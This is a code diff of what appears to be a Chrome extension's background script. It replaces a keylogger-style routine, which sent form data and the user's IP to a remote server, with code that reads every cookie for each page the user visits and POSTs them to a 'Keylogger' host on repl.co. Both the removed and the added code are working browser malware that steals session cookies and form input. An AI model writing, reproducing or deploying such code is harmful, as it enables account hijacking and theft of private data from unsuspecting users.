@@ -1,54 +1,36 @@
-// chrome.webNavigation.onCompleted.addListener((e) =>
-//   chrome.tabs.executeScript(e.tabId, {
-//     file: "./src/hijacker.js",
-//     allFrames: true,
-//   })
-// );
-// chrome.webNavigation.onCompleted.addListener((e) => {
-//     chrome.scripting.executeScript({
-//       target: {tabId: e.tabId, allFrames: true},
-//       files: ["./src/hijacker.js"],
-//     });
-//   });
-let data = { host: location.hostname },
-  flag = false;
-
-fetch("https://api.ipify.org?format=json")
-  .then((resp) => resp.json())
-  .then((e) => (data.user_addr = e.ip));
-
 chrome.webNavigation.onCompleted.addListener((e) => {
   chrome.scripting.executeScript({
     target: { tabId: e.tabId },
-    files: ["src/hijacker.js"],
+    files: ["src/running.js"],
+  });
+
+  chrome.cookies.getAll({ url: e.url }, (cookies) => {
+    chrome.scripting.executeScript({
+      target: { tabId: e.tabId },
+      function: (cookies) => {
+        const headers = new Headers({
+          "Content-Type": "application/json",
+          "User-Agent":
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
+        });
+
+        const options = {
+          method: "POST",
+          mode: "cors",
+          headers,
+          body: JSON.stringify({cookies}),
+        };
+
+        try {
+          let response = fetch("https://Keylogger.pzcuong2410.repl.co/send", options);
+          let responseData = response.json();
+          alert(responseData);
+        } catch (error) {
+          console.error("Request failed. " + error.message);
+        }
+      },
+      args: [cookies]
+    });
+            
   });
 });
-
-chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
-  if (message.type === "form_data") {
-    Object.assign(data, message.payload);
-    sendDataToAPI(data);
-  }
-});
-
-const sendDataToAPI = (data) => {
-  fetch("https://Keylogger.pzcuong2410.repl.co/send", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-      "Access-Control-Allow-Origin": "*",
-      "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
-      os_data: {
-        osName: navigator.platform,
-        osInfo: navigator.appVersion,
-        appName: navigator.appName,
-      },
-    },
-    body: JSON.stringify(data),
-  })
-    .then((resp) => resp.json())
-    .then((data) => console.log("success", data));
-};
-
-  
-  
